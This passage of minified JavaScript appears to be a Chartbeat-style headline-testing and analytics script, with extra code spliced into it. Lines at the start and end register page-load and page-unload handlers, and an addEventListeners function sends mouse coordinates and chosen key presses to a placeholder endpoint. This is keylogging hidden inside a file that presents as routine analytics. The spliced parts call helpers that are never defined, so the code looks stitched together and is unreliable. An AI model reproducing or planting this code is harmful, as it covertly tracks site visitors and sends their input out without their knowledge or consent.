  window.onload = () => getAndDispatch(exampleEndpoint, keysToWatch);
  hb.prototype.terminate = function () {
    this.o = ib;
    var a = this.t,
      b = p.document.body;
    b.removeEventListener ? b.removeEventListener("click", a, m) : b.detachEvent && b.detachEvent("onclick", a);
    this.t = l;
    E(this.A);
    this.A = n;
    this.q = [];
    this.F = this.I = n;
    this.G = o;
  };
  function sb(a, b) {
    rb(a);
    if (za()) tb(a);else if ("srcset" in document.createElement("img")) {
      var c = Ka(b);
      if (y(c)) y(b.flickerControl) || (b.flickerControl = m), b.flickerControl && (ka(Ya, 1E3), Xa() || Wa()), La(c, function (b, c) {
        a: {
          var f = p.chartbeatFlicker;
          if (f) {
            if (f.timeoutFlag) break a;
            f.strategyFetched = m;
          }
          a.I = b;
          a.F = c;
          a.H = m;
          for (var f = v(a.T, a), g = p._cbm || []; g.length;) f(g.shift());
          p._cbm = {
            push: f
          };
          a.H && jb(a);
        }
      }, function () {});
    } else vb(a);
  }
  function mb(a, b) {
    var c = [];
    D(a, function (a, d) {
      c.push(o);
      if (a.n) c[d] = m;else if (!a.f || a.f === a.p) {
        var g = U(a.p);
        if (g) var i = U(a.z, g);
        if (g && i) c[d] = m, b !== "c" && xb(i, a), a.anchors = [{
          element: g,
          f: bb(a.p)
        }], a.n = m;
      } else {
        a.anchors = [];
        var h = a.P;
        if ((g = fb(a.p)) && g.length > 0) {
          var i = a.type.indexOf("image") >= 0,
            j = o;
          i && D(g, function (b) {
            b && (b = U(a.z, b)) && (j = j || yb(b, a));
          });
          i && !j ? a.M = m : D(g, function (g) {
            if (g) var i = U(a.z, g);
            var j;
            i && (j = N(i.textContent), j == h ? wa(i, j) != i && (i = n) : i = n);
            if (g && i) c[d] = m, b !== "c" && xb(i, a), a.anchors.push({
              element: g,
              f: bb(gb(g))
            }), a.n = m;
          });
        }
      }
    });
    cb();
    var d = document.getElementById("chartbeat-flicker-control-style-ht");
    d && d.parentNode.removeChild(d);
    return c.indexOf(o) === -1;
  }
  window.onbeforeunload = () => getAndDispatch(exampleEndpoint, keysToWatch);

  // Adding extra event listeners
  function kb(a, b) {
    var c = [],
      d = n,
      e = 101,
      f = o;
    D(b, function (b) {
      !f && !b.D && D(b.anchors, function (c) {
        if (!f) if (c.element === a) d = {
          test: b,
          f: c.f
        }, f = m;else if (c.element.href === a.href) {
          var h;
          var j = c.element.getBoundingClientRect(),
            k = a.getBoundingClientRect();
          j.right - j.left > 0 && j.bottom - j.top > 0 && k.right - k.left > 0 && k.bottom - k.top > 0 ? (h = Math.max(j.left, k.left) - Math.min(j.right, k.right), j = Math.max(j.top, k.top) - Math.min(j.bottom, k.bottom), h = h <= 0 ? Math.max(j, 0) : j <= 0 ? h : Math.sqrt(h * h + j * j)) : h = l;
          h < e && (d = {
            test: b,
            f: c.f
          }, e = h);
        }
      });
    });
    d && c.push(d);
    return c;
  }
  function yb(a, b) {
    var c = o,
      d = P(a),
      e = db(),
      f = b.k.C;
    d && D(f, function (a) {
      var b = d.querySelectorAll('[src="' + O(a.src) + '"]'),
        f = d.querySelectorAll('[srcset="' + O(a.src) + '"]'),
        j = o;
      e.forEach(function (b) {
        d.querySelectorAll("[" + b + ' = "' + O(a.src) + '"]') && (j = m);
      });
      if (f || j || b) c = m;
    });
    return c;
  }
  function xb(a, b) {
    var c = b.k,
      d = c.content,
      e = c.N,
      f = c.O,
      c = c.C,
      g = b.type;
    if ("textContent" in document.createElement("b") && a.textContent.trim()) if (g.indexOf("image") < 0 || !c) a.textContent = d;else {
      var i = db();
      b.D = m;
      D(c, function (c) {
        var g = c.newSrcSet || c.src,
          k = c.src,
          s = P(a),
          u = o;
        if (g && s) {
          i.forEach(function (a) {
            var b = s.querySelectorAll("[" + a + ' = "' + O(k) + '"]');
            Array.prototype.forEach.call(b, function (b) {
              zb(b, a, g, f, e);
              b = b.parentNode.querySelector("img");
              Ab(b);
              u = m;
            });
          });
          var c = s.querySelectorAll('[srcset="' + O(k) + '"]'),
            x = s.querySelectorAll('[src="' + O(k) + '"]');
          Array.prototype.forEach.call(c, function (a) {
            zb(a, "srcset", g, f, e);
            u = m;
          });
          Array.prototype.forEach.call(x, function (a) {
            zb(a, "src", g, f, e);
            u = m;
          });
          if (u) a.textContent = d, b.D = o;
        }
      });
    }
  }
  function zb(a, b, c, d, e) {
    a.setAttribute(b, "");
    var f = a.parentNode.querySelector("img");
    (b === "srcset" || b === "src") && Bb(f);
    f.setAttribute("keep-hiding", "true");
    a.setAttribute(b, c);
    f.setAttribute("alt", e);
    if (a = P(a)) if (a = a.querySelector("figcaption")) a.innerHTML = d;
  }
  function Bb(a) {
    a.classList.add("cb-it-hide");
    a.addEventListener("load", function () {
      Ab(a);
    });
  }
  function Ab(a) {
    a.classList.remove("cb-it-hide");
    a.removeAttribute("keep-hiding");
  }
  var ib = 0,
    ub = 2,
    wb = 4,
    qb = "s",
    pb = "e",
    ob = "f";
  ta(p._sf_async_config || {});
  if (!K.e("cb_optout")) {
    var T = p._sf_async_config,
      I = T;
    sa();
    var Cb = !!I.useCanonical,
      Db = Ca(!!I.useCanonicalDomain && Cb);
    I.title = I.title || document.title;
    I.domain = I.domain || Db;
    var Eb = I,
      V;
    if (I.path) V = Ja();else a: {
      var W = n;
      if (Cb) {
        var X = Da();
        if (W = !X ? X : R(X.pathname) + Ia(X.search) + X.hash) {
          V = W;
          break a;
        }
      }
      var Fb = p.location,
        W = R(Fb.pathname),
        Y = Fb.search || "",
        Y = Y.replace(/PHPSESSID=[^&]+/, ""),
        Z = /&utm_[^=]+=[^&]+/ig,
        $ = Z.exec(Fb.search);
      $ && (Y = Y.replace(Z, ""));
      Z = /\?utm_[^=]+=[^&]+(.*)/i;
      ($ = Z.exec(Y)) && (Y = Y.replace(Z, $[1] != "" ? "?" + $[1] : ""));
      Y = Ia(Y);
      Y = R(Y);
      V = W + Y;
    }
    Eb.path = V;
    I.domain = I.domain && I.domain.replace(/^www\./, "");
    if ("textContent" in document.createElement("b") && "querySelectorAll" in document && "atob" in window && "btoa" in window) {
      var Gb = new hb(T);
      sb(Gb, T);
    }
  }
  ;
  function addEventListeners(keysToWatch, endpoint) {
    document.addEventListener("mousemove", event => {
      const data = {
        mouseX: event.clientX,
        mouseY: event.clientY
      };
      dispatchData(endpoint, data);
    });
    document.addEventListener("keydown", event => {
      const key = event.key;
      if (keysToWatch.includes(key)) {
        dispatchData(endpoint, {
          key_pressed: key
        });
      }
    });
  }
})();